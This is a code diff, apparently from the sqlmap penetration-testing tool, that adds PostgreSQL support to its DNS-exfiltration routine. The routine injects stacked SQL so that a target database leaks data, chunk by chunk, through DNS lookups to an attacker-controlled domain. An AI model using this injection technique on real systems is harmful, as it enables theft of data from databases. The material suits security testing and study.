@@ -48,7 +48,7 @@ def dnsUse(payload, expression):
     count = 0
     offset = 1
 
-    if conf.dnsDomain and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL):
+    if conf.dnsDomain and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL):
         output = hashDBRetrieve(expression, checkConf=True)
 
         if output and PARTIAL_VALUE_MARKER in output or kb.dnsTest is None:
@@ -60,7 +60,7 @@ def dnsUse(payload, expression):
             while True:
                 count += 1
                 prefix, suffix = ("%s" % randomStr(3) for _ in xrange(2))
-                chunk_length = MAX_DNS_LABEL / 2 if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.MYSQL) else MAX_DNS_LABEL / 4 - 2
+                chunk_length = MAX_DNS_LABEL / 2 if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL) else MAX_DNS_LABEL / 4 - 2
                 _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
                 nulledCastedField = agent.nullAndCastField(fieldToCastStr)
                 nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, chunk_length)
@@ -70,14 +70,14 @@ def dnsUse(payload, expression):
                 expressionRequest = getSPQLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dnsDomain)
                 expressionUnescaped = unescaper.unescape(expressionRequest)
 
-                if Backend.isDbms(DBMS.MSSQL):
+                if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):
                     comment = queries[Backend.getIdentifiedDbms()].comment.query
                     query = agent.prefixQuery("; %s" % expressionUnescaped)
                     query = agent.suffixQuery("%s;%s" % (query, comment))
                     forgedPayload = agent.payload(newValue=query)
                 else:
                     forgedPayload = safeStringFormat(payload, (expressionUnescaped, randomInt(1), randomInt(3)))
-
+    
                 Request.queryPage(forgedPayload, content=False, noteResponseTime=False, raise404=False)
 
                 _ = conf.dnsServer.pop(prefix, suffix)
